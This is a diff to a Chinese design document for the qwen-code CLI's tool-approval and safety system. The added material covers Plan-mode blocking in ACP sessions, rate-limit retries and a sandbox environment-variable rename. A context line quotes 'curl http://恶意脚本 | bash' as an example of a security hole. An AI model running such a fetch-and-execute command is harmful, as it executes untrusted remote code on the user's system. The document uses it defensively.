@@ -75,6 +75,9 @@ AI: curl http://恶意脚本 | bash  →  安全漏洞
 | `isTrustedFolder()` | 文件夹信任状态检查 | `packages/core/src/config/config.ts:1458-1472` |
 | `isShellCommandReadOnly()` | Shell 命令静态分析 | `packages/core/src/utils/shellReadOnlyChecker.ts:339-353` |
 | `McpClientManager` | MCP 工具发现与权限控制 | `packages/core/src/tools/mcp-client-manager.ts:55-58` |
+| **Session.runTool()** | **ACP 会话中 Plan 模式强制执行** | **`packages/cli/src/acp-integration/session/Session.ts:519-529`** |
+| **RateLimit 检测器** | **限流错误检测与重试信息生成** | **`packages/core/src/utils/rateLimit.ts:29-32`** |
+| **Sandbox 环境检测** | **集成测试环境变量检测** | **`packages/cli/src/utils/sandbox.ts:543-544`** |
 
 ### 2.3 核心组件交互关系
 
@@ -170,6 +173,29 @@ stateDiagram-v2
 | DEFAULT | 标准保护模式 | 日常开发（推荐） |
 | AUTO_EDIT | 自动编辑模式 | 批量重构、信任的项目 |
 | YOLO | 完全自动模式 | CI/CD、自动化脚本 |
+
+#### ACP 会话中的 Plan 模式强制执行
+
+在 ACP (Agent Communication Protocol) 会话中，Plan 模式会被强制强制执行：
+
+```typescript
+// packages/cli/src/acp-integration/session/Session.ts:519-529
+const isPlanMode = this.config.getApprovalMode() === ApprovalMode.PLAN;
+if (isPlanMode && !isExitPlanModeTool && confirmationDetails) {
+  // In plan mode, block any tool that requires confirmation (write operations)
+  return errorResponse(
+    new Error(
+      `Plan mode is active. The tool "${fc.name}" cannot be executed because it modifies the system. ` +
+        'Please use the exit_plan_mode tool to present your plan and exit plan mode before making changes.',
+    ),
+  );
+}
+```
+
+**设计意图**：
+- **防止误操作**：在 ACP 会话中，AI 可能无法直接感知用户意图，强制 Plan 模式可以阻止意外的写操作
+- **明确边界**：只有标记为 `readOnlyHint: true` 的 MCP 工具可以在 Plan 模式下执行
+- **用户引导**：错误消息明确告知用户如何退出 Plan 模式并执行修改操作
 
 #### 关键代码
 
@@ -640,6 +666,7 @@ flowchart LR
 | 用户取消 | 确认对话框选择"取消" | `ToolConfirmationOutcome.Cancel` |
 | 参数无效 | 工具参数验证失败 | `BaseDeclarativeTool.build():283-285` |
 | 模式限制 | PLAN 模式尝试编辑 | `setApprovalMode():1231-1239` |
+| **ACP Plan 模式拦截** | **ACP 会话中写操作被阻止** | **`Session.runTool():519-529`** |
 | 信任限制 | 不受信任文件夹使用 YOLO | `setApprovalMode():1231-1239` |
 | 命令拒绝 | Shell 命令被黑名单拦截 | `shell-utils.ts:889-899` |
 
@@ -660,7 +687,75 @@ if (effectiveTimeout) {
 }
 ```
 
-### 7.3 错误恢复策略
+### 7.3 速率限制重试机制
+
+**设计目标**：处理 API 提供商的限流错误（TPM 限制、GLM 限流等），提供用户友好的倒计时重试 UI。
+
+#### 限流错误检测
+
+```typescript
+// packages/core/src/utils/rateLimit.ts:9-32
+// Known rate-limit error codes across providers.
+// 429  - Standard HTTP "Too Many Requests" (DashScope TPM, OpenAI, etc.)
+// 503  - Provider throttling/overload (treated as rate-limit for retry UI)
+// 1302 - Z.AI GLM rate limit (https://docs.z.ai/api-reference/api-code)
+const RATE_LIMIT_ERROR_CODES = new Set([429, 503, 1302]);
+
+export function isRateLimitError(error: unknown): boolean {
+  const code = getErrorCode(error);
+  return code !== null && RATE_LIMIT_ERROR_CODES.has(code);
+}
+```
+
+#### 重试策略
+
+```typescript
+// packages/core/src/core/geminiChat.ts:315-345
+const isRateLimit = isRateLimitError(error);
+if (
+  isRateLimit &&
+  rateLimitRetryCount < RATE_LIMIT_RETRY_OPTIONS.maxRetries
+) {
+  rateLimitRetryCount++;
+  const delayMs = RATE_LIMIT_RETRY_OPTIONS.delayMs; // 固定 60s
+  const message = parseAndFormatApiError(
+    error instanceof Error ? error.message : String(error),
+  );
+  debugLogger.warn(
+    `Rate limit throttling detected (retry ${rateLimitRetryCount}/${RATE_LIMIT_RETRY_OPTIONS.maxRetries}). ` +
+      `Waiting ${delayMs / 1000}s before retrying...`,
+  );
+  yield {
+    type: StreamEventType.RETRY,
+    retryInfo: {
+      message,
+      attempt: rateLimitRetryCount,
+      maxRetries: RATE_LIMIT_RETRY_OPTIONS.maxRetries,
+      delayMs,
+    },
+  };
+  // Don't count rate-limit retries against the content retry limit
+  attempt--;
+  await new Promise((res) => setTimeout(res, delayMs));
+  continue;
+}
+```
+
+#### 重试参数配置
+
+| 参数 | 值 | 说明 |
+|-----|-----|------|
+| maxRetries | 10 | 最大重试次数 |
+| delayMs | 60000 | 固定重试间隔（60秒） |
+| 支持的错误码 | 429, 503, 1302 | 涵盖主流提供商限流码 |
+
+**关键设计决策**：
+- **固定延迟**：使用固定 60 秒延迟而非指数退避，因为限流通常是基于时间窗口的
+- **独立计数**：限流重试不计入内容错误重试次数，避免过早失败
+- **流式通知**：通过 `StreamEventType.RETRY` 事件向 UI 层传递重试信息，支持倒计时显示
+- **多提供商支持**：覆盖 DashScope TPM、OpenAI、GLM (Z.AI) 等主流提供商的限流码
+
+### 7.4 错误恢复策略
 
 | 错误类型 | 处理策略 | 代码位置 |
 |---------|---------|---------|
@@ -669,6 +764,58 @@ if (effectiveTimeout) {
 | 磁盘满 | 返回 NO_SPACE_LEFT 类型错误 | `write-file.ts:340-341` |
 | 命令超时 | 返回超时前输出 | `shell.ts:300-306` |
 | MCP 连接失败 | 记录错误，不阻止其他服务器 | `mcp-client-manager.ts:92-100` |
+
+### 7.5 Sandbox 环境变量变更
+
+**BREAKING CHANGE**：集成测试环境变量名称已变更。
+
+| 旧名称 | 新名称 | 影响范围 |
+|-------|-------|---------|
+| `GEMINI_CLI_INTEGRATION_TEST` | `QWEN_CODE_INTEGRATION_TEST` | 集成测试、CI/CD 配置 |
+
+#### 代码变更
+
+```typescript
+// packages/cli/src/utils/sandbox.ts:543-544
+const isIntegrationTest =
+  process.env['QWEN_CODE_INTEGRATION_TEST'] === 'true';
+
+// 容器命名逻辑
+if (isIntegrationTest) {
+  containerName = `qwen-code-integration-test-${randomBytes(4).toString('hex')}`;
+} else {
+  containerName = `${imageName}-${index}`;
+}
+```
+
+#### UID/GID 处理改进
+
+集成测试模式下，SANDBOX_SET_UID_GID 现在可以正常工作：
+
+```typescript
+// packages/cli/src/utils/sandbox.ts:720-767
+const useCurrentUser = await shouldUseCurrentUserInSandbox();
+
+if (useCurrentUser) {
+  // SANDBOX_SET_UID_GID is enabled: create user with host's UID/GID
+  // This includes integration test mode with SANDBOX_SET_UID_GID=true,
+  // allowing tests that need to access host's ~/.qwen (e.g., --resume) to work.
+  args.push('--user', 'root');
+  const uid = execSync('id -u').toString().trim();
+  const gid = execSync('id -g').toString().trim();
+
+  // 创建与主机 UID/GID 匹配的用户
+  const setupUserCommands = [
+    `groupadd -f -g ${gid} ${username}`,
+    `id -u ${username} &>/dev/null || useradd -o -u ${uid} -g ${gid} -d ${homeDir} -s /bin/bash ${username}`,
+  ].join(' && ');
+}
+```
+
+**迁移指南**：
+- 更新 CI/CD 脚本中的环境变量引用
+- 检查本地开发环境的 `.env` 文件
+- 更新文档和团队配置指南
 
 ---
 
@@ -692,6 +839,11 @@ if (effectiveTimeout) {
 | 命令权限检查 | `packages/core/src/utils/shell-utils.ts` | 889-899 | isCommandAllowed |
 | MCP 信任检查 | `packages/core/src/tools/mcp-client-manager.ts` | 55-58 | discoverAllMcpTools |
 | UI 确认组件 | `packages/cli/src/ui/components/messages/ToolConfirmationMessage.tsx` | 1-300+ | 确认对话框 UI |
+| **ACP Plan 模式强制执行** | **`packages/cli/src/acp-integration/session/Session.ts`** | **519-529** | **runTool() Plan 模式拦截** |
+| **限流错误检测** | **`packages/core/src/utils/rateLimit.ts`** | **29-32** | **isRateLimitError()** |
+| **限流重试逻辑** | **`packages/core/src/core/geminiChat.ts`** | **315-345** | **Rate limit retry with countdown UI** |
+| **Sandbox 环境变量** | **`packages/cli/src/utils/sandbox.ts`** | **543-544** | **QWEN_CODE_INTEGRATION_TEST** |
+| **Sandbox UID/GID 处理** | **`packages/cli/src/utils/sandbox.ts`** | **720-767** | **集成测试用户权限** |
 
 ---
 
@@ -708,4 +860,5 @@ if (effectiveTimeout) {
 ---
 
 *✅ Verified: 基于 qwen-code/packages/core/src/config/config.ts、tools/*.ts、utils/shell-utils.ts 等源码分析*
-*基于版本：2025-02 | 最后更新：2026-02-24*
+*⚠️ Updated: 2026-03-02 - 新增 Plan 模式强制执行、速率限制重试、Sandbox 环境变量变更*
+*基于版本：2025-02 | 最后更新：2026-03-02*
